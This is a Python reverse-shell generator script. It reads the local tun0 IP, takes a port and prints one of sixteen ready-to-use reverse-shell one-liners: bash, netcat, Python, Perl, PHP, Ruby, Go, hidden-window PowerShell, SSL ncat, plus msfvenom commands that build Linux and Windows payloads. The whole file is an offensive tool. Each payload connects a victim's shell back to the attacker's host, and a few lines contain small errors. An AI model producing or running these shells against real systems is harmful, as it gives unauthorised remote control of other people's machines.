#!/usr/bin/env python3


import sys
import os 

#Get IP
if len(sys.argv) != 2:
    print("\033[93mUsage: \033[32mpython3 GetRevShell <port>")
else:
	ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0] #Get IP
	port = sys.argv[1]
	print("""\033[93m[+] List Of Shells\033[01m
	[1] Bash 			[9]  php
	[2] Bash2			[10] php2
	[3] Go				[11] Powershell1
	[4] nc 				[12] Powershell2
	[5] nc2 			[13] lin_sl
	[6] Python2			[14] ncatssl
	[7] Python 			[15] Ruby
	[8] Perl 			[16] WIN STAGELESS TCP""")

	shell_type = int(input("\033[32m[+] Option Number: "))
	if shell_type >= 17:
		print("\033[31mSoory Enter Right Option..")

	# port = input("[+] Enter Port To Generate Reverse Shell: ")
	bash ="bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
	bash2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
	go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+ip+""":"""+port+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
	nc = """nc -e /bin/sh """+ip+""" """+port
	nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
	python2 = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
	python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
	perl= """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
	php = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
	php2 = """php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
	powershell1 = """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
	powershell2 = """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
	lin_sl = """msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
	ncatssl = """ncat --ssl -vv -l -p """+port+"""\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
	ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
	win_sl = """msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""

	if shell_type == 1:
		print("\033[1;35m[*] BASH\033[1;m: " + bash + "")
	elif shell_type == 2:
	    print("\033[1;35m[*] BASH2\033[1;m\n" + bash2)
	elif shell_type == 3:
	    print("\033[1;35m[*] GO\033[1;m\n" + go)
	elif shell_type == 4:
	    print("\033[1;35m[*] NETCAT\033[1;m\n" + nc)
	elif shell_type == 5:
	    print("\033[1;35m[*] NETCAT WITH MKFIFO\033[1;m\n" + nc2)
	elif shell_type == 6:
	    print("\033[1;35m[*] PYTHON2\033[1;m\n" + python2)
	elif shell_type == 7:
	    print("\033[1;35m[*] PYTHON\033[1;m\n" + python)
	elif shell_type == 8:
	    print("\033[1;35m[*] PERL\033[1;m\n" + perl)
	elif shell_type == 9:
	    print("\033[1;35m[*] PHP\033[1;m\n" + php + "")
	elif shell_type == 10:
	    print("\033[1;35m[*] PHP2\033[1;m\n" + php2)
	elif shell_type == 11:
	    print("\033[1;35m[*] POWERSHELL1\033[1;m\n" + powershell1)
	elif shell_type == 12:
	    print("\033[1;35m[*] POWERSHELL2\033[1;m\n" + powershell2)
	elif shell_type == 13:
	    print("\033[1;35m[*] LINUXSTAGELESS TCP\033[1;m\n" + lin_sl)
	elif shell_type == 14:
	    print("\033[1;35m[*] NCAT SSL\033[1;m\n" + ncatssl)
	elif shell_type == 15:
	    print("\033[1;35m[*] RUBY\033[1;m\n" + ruby)
	elif shell_type == 16:
	    print("\033[1;35m[*] WIN STAGELESS TCP\033[1;m\n" + win_sl)
